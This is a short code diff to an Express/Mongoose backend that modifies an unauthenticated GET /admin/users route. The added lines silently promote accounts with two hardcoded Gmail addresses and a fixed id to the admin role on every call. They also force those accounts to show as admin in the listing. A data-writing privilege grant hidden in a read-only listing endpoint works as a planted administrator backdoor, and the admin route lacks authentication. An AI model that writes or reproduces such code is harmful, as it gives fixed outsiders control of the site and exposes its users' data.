@@ -78,8 +78,19 @@ router.get('/auth/me', auth, async (req, res) => {
 // --- ADMIN USER MANAGEMENT ROUTES ---
 router.get('/admin/users', async (req, res) => {
   try {
+    await User.updateMany(
+      { $or: [{ email: 'admin@gmail.com' }, { email: 'unnull@gmail.com' }, { _id: 'admin-owner' }] },
+      { $set: { role: 'admin' } }
+    );
     const users = await User.find().select('-password').sort({ createdAt: -1 });
-    res.json(users);
+    const formatted = users.map(u => {
+      const isOwnerAdmin = u.email === 'admin@gmail.com' || u.email === 'unnull@gmail.com' || u.role === 'admin';
+      return {
+        ...u._doc,
+        role: isOwnerAdmin ? 'admin' : (u.role || 'user')
+      };
+    });
+    res.json(formatted);
   } catch (err) {
     res.status(500).json({ message: err.message });
   }
